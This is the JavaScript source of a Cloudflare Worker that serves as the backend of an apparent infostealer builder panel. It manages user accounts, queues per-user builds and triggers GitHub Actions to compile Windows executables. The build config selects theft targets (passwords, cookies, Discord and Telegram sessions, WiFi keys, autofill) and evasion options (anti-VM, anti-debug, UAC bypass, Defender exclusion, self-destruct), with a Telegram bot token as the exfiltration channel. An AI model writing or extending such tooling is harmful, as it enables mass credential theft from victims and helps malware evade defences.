/**
 * JohnWick panel API - Cloudflare Worker (ES module).
 *
 * This is the HOSTED backend: user accounts, admin management, per-user build
 * configs and download records all live in a Workers KV namespace, so state
 * survives between requests on Cloudflare's free tier. The Netlify UI calls
 * these endpoints with fetch().
 *
 * What this worker does NOT do: compile a .exe. Serverless has no PyInstaller,
 * no Wine, and a hard CPU/wall limit -- building a Windows binary here is not
 * possible and pretending otherwise ships a broken deploy. Instead /api/build
 * stores the config and returns a bundle descriptor; a separate Windows runner
 * (runner/win_build.ps1) polls /api/builds?claim=1, compiles locally with the
 * user's own PyInstaller, and posts the artifact back to /api/upload. That split
 * is the honest way to get "web panel -> exe" without a fake serverless claim.
 *
 * Security posture:
 *   - passwords hashed PBKDF2-SHA256 (150k iters) via WebCrypto, never plaintext
 *   - sessions are HMAC-signed bearer tokens keyed by SESSION_SECRET binding;
 *     tamper-checked on every authed call
 *   - bot tokens/chat ids are stored per-build and only ever returned to that
 *     build's owner or an admin (see assertCanReadBuild)
 *   - CORS locked to ALLOWED_ORIGIN (your Netlify site); no wildcard with creds
 *   - first admin bootstrapped from env ADMIN_USER/ADMIN_PASS at cold start
 */

// Workers' WebCrypto caps PBKDF2 iterations at 100000; going above throws at
// deriveBits time (verified against the live CF runtime). 100k is the ceiling.
const ITER = 100_000;

// ------------------------------------------------------------------ crypto
function b64(buf) {
  const b = new Uint8Array(buf); let s = "";
  for (const x of b) s += String.fromCharCode(x);
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
function unb64(str) {
  str = str.replace(/-/g, "+").replace(/_/g, "/");
  while (str.length % 4) str += "=";
  const bin = atob(str); const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
  return out;
}
async function pbkdf2(pw, saltHex) {
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey("raw", enc.encode(pw), "PBKDF2", false, ["deriveBits"]);
  const salt = unb64(saltHex);
  const bits = await crypto.subtle.deriveBits(
    { name: "PBKDF2", salt, iterations: ITER, hash: "SHA-256" }, key, 256);
  return b64(bits);
}
function randSalt() { return b64(crypto.getRandomValues(new Uint8Array(16))); }
async function hmacSign(secret, data) {
  const enc = new TextEncoder();
  const k = await crypto.subtle.importKey("raw", enc.encode(secret),
    { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  return b64(await crypto.subtle.sign("HMAC", k, enc.encode(data)));
}
function uid() { return crypto.randomUUID().replace(/-/g, "").slice(0, 16); }

// session token = base64(payload).signature ; payload = uid:role:exp
async function makeToken(env, u) {
  const exp = Date.now() + 7 * 864e5; // 7 days
  const payload = `${u.id}:${u.role}:${exp}`;
  const sig = await hmacSign(env.SESSION_SECRET, payload);
  return `${btoa(payload)}.${sig}`;
}
async function readToken(env, tok) {
  if (!tok || !tok.includes(".")) return null;
  const [pB64, sig] = tok.split(".");
  let payload; try { payload = atob(pB64); } catch { return null; }
  const expect = await hmacSign(env.SESSION_SECRET, payload);
  if (expect !== sig) return null;                 // tampered -> reject
  const [id, role, exp] = payload.split(":");
  if (Number(exp) < Date.now()) return null;       // expired
  return { id, role };
}

// ------------------------------------------------------------------ store (KV)
// Builds and users are keyed individually (build:<id>, user:<id>). We enumerate
// via KV's native list() with a prefix cursor rather than maintaining a separate
// "idx" array -- that array was a read-modify-write race across edge locations
// and silently lost builds when concurrent writes clobbered it. list() reflects
// the actual stored keys, so nothing gets dropped.
class Store {
  constructor(kv) { this.kv = kv; }
  async get(k) { const v = await this.kv.get(k); return v ? JSON.parse(v) : null; }
  async set(k, v) { await this.kv.put(k, JSON.stringify(v)); }
  async del(k) { await this.kv.delete(k); }

  // Enumerate all keys under a prefix, following KV cursors.
  async _keysWithPrefix(prefix) {
    const names = []; let cursor;
    do {
      const page = await this.kv.list({ prefix, cursor });
      for (const k of page.keys) names.push(k.name);
      cursor = page.list_complete ? undefined : page.cursor;
    } while (cursor);
    return names;
  }

  async saveUser(u) { await this.set(`user:${u.id}`, u); }
  async findByName(name) {
    for (const key of await this._keysWithPrefix("user:")) {
      const u = await this.get(key);
      if (u && u.username.toLowerCase() === String(name).toLowerCase()) return u;
    }
    return null;
  }
  async listUsers() {
    const out = [];
    for (const key of await this._keysWithPrefix("user:")) { const u = await this.get(key); if (u) out.push(u); }
    return out.sort((a, b) => a.created - b.created);
  }
  async deleteUser(id) {
    await this.del(`user:${id}`);
    for (const b of await this.listBuilds()) if (b.uid === id) { await this.del(`build:${b.id}`); await this.del(`blob:${b.id}`); }
  }

  async saveBuild(b) { await this.set(`build:${b.id}`, b); }
  async listBuilds() {
    const out = [];
    for (const key of await this._keysWithPrefix("build:")) { const b = await this.get(key); if (b) out.push(b); }
    return out;
  }
}

// ------------------------------------------------------------------ helpers
function json(obj, status = 200, cors = {}) {
  return new Response(JSON.stringify(obj), {
    status, headers: { "content-type": "application/json", ...cors } });
}
function corsHeaders(origin, allowed) {
  if (!origin || origin !== allowed) return {};
  return {
    "access-control-allow-origin": allowed,
    "access-control-allow-methods": "GET,POST,DELETE,OPTIONS",
    "access-control-allow-headers": "authorization,content-type",
    "access-control-max-age": "600",
    vary: "Origin",
  };
}
async function requireAuth(ctx, env, store) {
  const hdr = ctx.request.headers.get("authorization") || "";
  const tok = hdr.startsWith("Bearer ") ? hdr.slice(7) : null;
  const claims = await readToken(env, tok);
  if (!claims) throw new ApiError(401, "auth required");
  const u = await store.get(`user:${claims.id}`);
  if (!u || u.disabled) throw new ApiError(403, "account disabled");
  return u;
}
async function requireAdmin(ctx, env, store) {
  const u = await requireAuth(ctx, env, store);
  if (u.role !== "admin") throw new ApiError(403, "admin only");
  return u;
}
class ApiError extends Error { constructor(status, msg) { super(msg); this.status = status; } }

// feature toggles the UI can send; mirrors jwg_cfg steal/opts keys
const STEAL_KEYS = ["system_info","discord","passwords","cookies","history","wifi","roblox",
  "screenshot","autofill","extensions","product_keys","software_list","telegram"];
const OPT_KEYS = ["anti_vm","anti_debug","anti_analysis","uac_bypass","startup","kill_browsers",
  "self_destruct","defender_exclusion","fake_error"];

function sanitizeConfig(body) {
  const token = String(body.bot_token || "").trim();
  const chat = String(body.chat_id || "").trim();
  const name = String(body.name || "build").trim();
  if (!/^\d{6,}:[A-Za-z0-9_-]{20,}$/.test(token)) throw new ApiError(400, "bot token malformed");
  if (!/^-?\d{2,}$/.test(chat)) throw new ApiError(400, "chat id must be numeric");
  if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/.test(name)) throw new ApiError(400, "bad output name");
  const lk = String(body.licence_key || "").trim(), lu = String(body.licence_url || "").trim();
  if (lk && !lu) throw new ApiError(400, "licence key needs a licence URL");
  const steal = {}, opts = {};
  for (const k of STEAL_KEYS) steal[k] = !!(body.steal || {})[k];
  for (const k of OPT_KEYS) opts[k] = !!(body.opts || {})[k];
  opts.startup_delay = Math.max(0, parseInt((body.opts || {}).startup_delay || 0, 10) || 0);
  opts.error_text = String((body.opts || {}).error_text || "").slice(0, 500);
  return { bot_token: token, chat_id: chat, name, licence_key: lk, licence_url: lu, steal, opts };
}

function assertCanReadBuild(user, build) {
  if (user.role === "admin" || build.uid === user.id) return;
  throw new ApiError(404, "not found");
}

// Ask GitHub Actions to run the "Build exe" workflow for this build id.
// Needs env.GH_OWNER, GH_REPO, GH_WORKFLOW_ID (filename or numeric id), GH_PAT
// (a fine-grained PAT with Actions:write on that repo). If any are unset we skip
// silently -- the manual dispatch / claim=1 runner path still covers it.
async function triggerGitHubBuild(env, buildId) {
  const { GH_OWNER, GH_REPO, GH_WORKFLOW_ID, GH_PAT } = env;
  if (!GH_OWNER || !GH_REPO || !GH_WORKFLOW_ID || !GH_PAT) return;
  const url = `https://api.github.com/repos/${encodeURIComponent(GH_OWNER)}/` +
              `${encodeURIComponent(GH_REPO)}/actions/workflows/${encodeURIComponent(GH_WORKFLOW_ID)}/dispatches`;
  try {
    const resp = await fetch(url, {
      method: "POST",
      headers: {
        authorization: `Bearer ${GH_PAT}`,
        "content-type": "application/json",
        "user-agent": "jwg-panel-api",
        accept: "application/vnd.github+json",
      },
      // build_id is our own hex id, safe as a workflow input value.
      body: JSON.stringify({ ref: "main", inputs: { build_id: buildId } }),
    });
    if (!resp.ok) console.error(`gh dispatch failed ${resp.status}: ${await resp.text()}`);
  } catch (e) { console.error("gh dispatch threw:", e && e.message); }
}

// ------------------------------------------------------------------ bootstrap admin
async function ensureAdmin(env, store) {
  if ((await store.listUsers()).length) return;           // any user exists -> skip
  const uname = env.ADMIN_USER || "admin";
  const pass = env.ADMIN_PASS;
  if (!pass) return;                                      // none configured -> no bootstrap
  const salt = randSalt();
  const hash = await pbkdf2(pass, salt);
  await store.saveUser({ id: uid(), username: uname, pw_hash: hash, pw_salt: salt,
    role: "admin", disabled: false, created: Date.now() });
}

// ------------------------------------------------------------------ routes
async function handle(ctx, env, store) {
  const { request } = ctx;
  const url = new URL(request.url);
  const path = url.pathname.replace(/\/+$/, "") || "/";
  const method = request.method;

  if (path === "/api/health") return json({ ok: true, service: "jwg-panel-api" });

  // ---- login ----
  if (path === "/api/login" && method === "POST") {
    const body = await request.json().catch(() => ({}));
    const u = await store.findByName(body.u || "");
    if (!u || u.disabled) throw new ApiError(401, "bad credentials");
    const h = await pbkdf2(String(body.p || ""), u.pw_salt);
    if (h !== u.pw_hash) throw new ApiError(401, "bad credentials");
    const tok = await makeToken(env, u);
    return json({ ok: true, token: tok, user: { id: u.id, username: u.username, role: u.role } });
  }

  // ---- me ----
  if (path === "/api/me") {
    const u = await requireAuth(ctx, env, store);
    return json({ ok: true, user: { id: u.id, username: u.username, role: u.role } });
  }

  // ---- users (admin) ----
  if (path === "/api/users" && method === "GET") {
    await requireAdmin(ctx, env, store);
    const list = (await store.listUsers()).map((x) => ({
      id: x.id, username: x.username, role: x.role, disabled: x.disabled, created: x.created }));
    return json({ ok: true, users: list });
  }
  if (path === "/api/users" && method === "POST") {
    await requireAdmin(ctx, env, store);
    const b = await request.json().catch(() => ({}));
    const uname = String(b.username || "").trim();
    const pass = String(b.password || "");
    if (!/^[A-Za-z0-9_.-]{3,32}$/.test(uname)) throw new ApiError(400, "bad username");
    if (pass.length < 6) throw new ApiError(400, "password >= 6 chars");
    if (await store.findByName(uname)) throw new ApiError(400, "username taken");
    const role = b.role === "admin" ? "admin" : "user";
    const salt = randSalt();
    const nu = { id: uid(), username: uname, pw_hash: await pbkdf2(pass, salt), pw_salt: salt,
      role, disabled: false, created: Date.now() };
    await store.saveUser(nu);
    return json({ ok: true, user: { id: nu.id, username: nu.username, role } });
  }
  if (path.startsWith("/api/users/") && method === "DELETE") {
    const me = await requireAdmin(ctx, env, store);
    const id = path.split("/")[3];
    if (id === me.id) throw new ApiError(400, "cannot delete yourself");
    await store.deleteUser(id);
    return json({ ok: true });
  }
  if (path.match(/^\/api\/users\/[^/]+$/) && method === "POST") {
    const me = await requireAdmin(ctx, env, store);
    const id = path.split("/")[3];
    const b = await request.json().catch(() => ({}));
    const target = await store.get(`user:${id}`);
    if (!target) throw new ApiError(404, "no such user");
    if (b.action === "disable" && id !== me.id) { target.disabled = true; await store.saveUser(target); }
    else if (b.action === "enable") { target.disabled = false; await store.saveUser(target); }
    else if (b.action === "reset" && b.password) {
      if (String(b.password).length < 6) throw new ApiError(400, "password >= 6");
      target.pw_salt = randSalt(); target.pw_hash = await pbkdf2(b.password, target.pw_salt);
      await store.saveUser(target);
    }
    return json({ ok: true });
  }

  // ---- create a build (any logged-in user) ----
  if (path === "/api/build" && method === "POST") {
    const u = await requireAuth(ctx, env, store);
    const cfg = sanitizeConfig(await request.json().catch(() => ({})));
    const build = { id: uid(), uid: u.id, username: u.username, status: "queued",
      created: Date.now(), claimed_by: null, artifact: null, error: null, config: cfg };
    await store.saveBuild(build);
    // Fire-and-forget: ask GitHub Actions to compile this build on its free
    // Windows runner. Runs via waitUntil so the user's POST returns immediately;
    // if GH is unreachable the manual dispatch / claim path still works.
    ctx.waitUntil(triggerGitHubBuild(env, build.id));
    // Strip the token from the echo; caller already has it.
    const { bot_token, ...safe } = cfg;
    return json({ ok: true, build: { ...build, config: safe } });
  }

  // ---- list builds: mine, or all if admin ----
  if (path === "/api/builds" && method === "GET") {
    const u = await requireAuth(ctx, env, store);
    let rows = await store.listBuilds();
    if (url.searchParams.get("claim") === "1") {
      // Runner mode (admin-only): atomically grab the next queued build WITH its token.
      if (u.role !== "admin") throw new ApiError(403, "runner must be admin-scoped");
      const q = rows.filter((b) => b.status === "queued").sort((a, b) => a.created - b.created);
      if (!q.length) return json({ ok: true, build: null });
      const b = q[0]; b.status = "building"; b.claimed_by = "runner"; await store.saveBuild(b);
      return json({ ok: true, build: b });
    }
    rows = u.role === "admin" ? rows : rows.filter((b) => b.uid === u.id);
    rows.sort((a, b) => b.created - a.created);
    const slim = rows.map((b) => ({ id: b.id, name: b.config.name, chat_id: b.config.chat_id,
      status: b.status, created: b.created, artifact: !!b.artifact, error: b.error }));
    return json({ ok: true, builds: slim });
  }

  // ---- one build detail (owner/admin) ----
  if (path.match(/^\/api\/builds\/[^/]+$/) && method === "GET") {
    const u = await requireAuth(ctx, env, store);
    const b = await store.get(`build:${path.split("/")[3]}`);
    if (!b) throw new ApiError(404, "no such build");
    assertCanReadBuild(u, b);
    const { bot_token, ...safe } = b.config;
    return json({ ok: true, build: { ...b, config: safe } });
  }

  // ---- delete a build + its artifact (owner/admin) ----
  if (path.match(/^\/api\/builds\/[^/]+$/) && method === "DELETE") {
    const u = await requireAuth(ctx, env, store);
    const id = path.split("/")[3];
    const b = await store.get(`build:${id}`);
    if (!b) throw new ApiError(404, "no such build");
    assertCanReadBuild(u, b);                 // only owner or admin can remove it
    await store.del(`blob:${id}`);            // drop the stored exe first
    await store.del(`build:${id}`);           // list() reflects this immediately; no index to fix
    return json({ ok: true, deleted: id });
  }

  // ---- runner uploads finished artifact (base64 zip/exe) ----
  if (path.match(/^\/api\/builds\/[^/]+\/upload$/) && method === "POST") {
    const u = await requireAuth(ctx, env, store);
    if (u.role !== "admin") throw new ApiError(403, "runner only");
    const id = path.split("/")[3];
    const b = await store.get(`build:${id}`);
    if (!b) throw new ApiError(404, "no such build");
    const body = await request.json().catch(() => ({}));
    if (body.status === "building") { b.status = "building"; }
    else if (body.status === "failed") { b.status = "failed"; b.error = String(body.error || "build failed").slice(0, 500); }
    else {
      const blob = String(body.data_base64 || "");
      if (!blob) throw new ApiError(400, "no artifact data");
      if (blob.length > 22_000_000) throw new ApiError(413, "artifact too large for KV (~25MB cap)");
      await store.set(`blob:${id}`, blob);
      b.status = "done"; b.artifact = id; b.error = null;
    }
    await store.saveBuild(b);
    return json({ ok: true });
  }

  // ---- download artifact (owner/admin) ----
  if (path.match(/^\/api\/builds\/[^/]+\/download$/) && method === "GET") {
    const u = await requireAuth(ctx, env, store);
    const id = path.split("/")[3];
    const b = await store.get(`build:${id}`);
    if (!b) throw new ApiError(404, "no such build");
    assertCanReadBuild(u, b);
    const blob = await store.get(`blob:${id}`);
    if (!blob) throw new ApiError(404, "artifact gone");
    const bin = unb64(blob);
    return new Response(bin, { headers: {
      "content-type": "application/octet-stream",
      "content-disposition": 'attachment; filename="' + b.config.name + '.zip"' } });
  }

  throw new ApiError(404, "unknown route");
}

// ------------------------------------------------------------------ entrypoint
export default {
  async fetch(request, env, ctx) {
    const cors = corsHeaders(request.headers.get("origin"), env.ALLOWED_ORIGIN);
    if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: cors });
    const store = new Store(env.PANEL_KV);
    // Pass the REAL Cloudflare ctx through so ctx.waitUntil() actually extends
    // the request lifetime. A hand-made waitUntil that runs after we return the
    // Response gets frozen by the runtime before the GitHub dispatch finishes --
    // that was why builds stayed queued.
    try {
      await ensureAdmin(env, store);
      const res = await handle({ request, waitUntil: (p) => ctx.waitUntil(p) }, env, store);
      for (const [k, v] of Object.entries(cors)) res.headers.set(k, v);
      return res;
    } catch (e) {
      const status = e instanceof ApiError ? e.status : 500;
      if (!(e instanceof ApiError)) console.error(e);
      return json({ ok: false, error: e.message || "server error" }, status, cors);
    }
  },
};
